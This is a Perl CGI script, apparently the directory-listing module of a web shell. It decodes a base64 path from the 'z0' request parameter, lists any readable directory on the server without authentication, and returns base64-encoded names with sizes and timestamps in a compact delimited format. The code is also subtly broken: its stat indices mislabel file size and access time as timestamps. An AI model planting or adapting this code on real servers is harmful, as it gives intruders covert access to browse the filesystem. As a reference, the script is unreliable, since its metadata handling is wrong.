use strict;
use warnings;
use CGI;
use MIME::Base64 qw(decode_base64 encode_base64);
use File::Spec;
use Cwd qw(abs_path);

sub to_iso {
    my $t = shift;

    # fallback instead of empty string
    return "1970-01-01T00:00:00"
        unless defined $t && $t > 0;

    my @t = localtime($t);

    return sprintf(
        "%04d-%02d-%02dT%02d:%02d:%02d",
        $t[5] + 1900,
        $t[4] + 1,
        $t[3],
        $t[2],
        $t[1],
        $t[0]
    );
}

my $q = CGI->new;

my $dir = eval { decode_base64($q->param('z0') || '') };
$dir //= '';

# normalize path (important for Windows/IIS)
$dir = abs_path($dir) if -d $dir;

if (!$dir || !-d $dir) {
    print "ERROR://Invalid directory";
    exit;
}

opendir(my $dh, $dir) or do {
    print "ERROR://Cannot open directory";
    exit;
};

my @entries = grep { $_ ne '.' && $_ ne '..' } readdir($dh);
closedir($dh);

my @result;

foreach my $entry (@entries) {

    my $path = File::Spec->catfile($dir, $entry);

    # ensure file exists before stat
    next unless -e $path;

    my @stat = stat($path);

    # robust fallback (prevents empty datetime)
    my ($ctime, $mtime, $atime) = (0, 0, 0);

    if (@stat) {
        ($ctime, $mtime, $atime) = @stat[9, 8, 7];
    }

    my $prefix = (-d $path) ? '/' : '';

    my $encoded_name = encode_base64($prefix . $entry, '');

    my $type = (-d $path) ? 'DIR' : 'FILE';
    my $size = (-f $path) ? -s $path : 0;

    push @result, join('?', (
        $encoded_name,
        $type,
        $size,
        to_iso($ctime),
        to_iso($mtime),
        to_iso($atime),
    ));
}

print join('|', @result);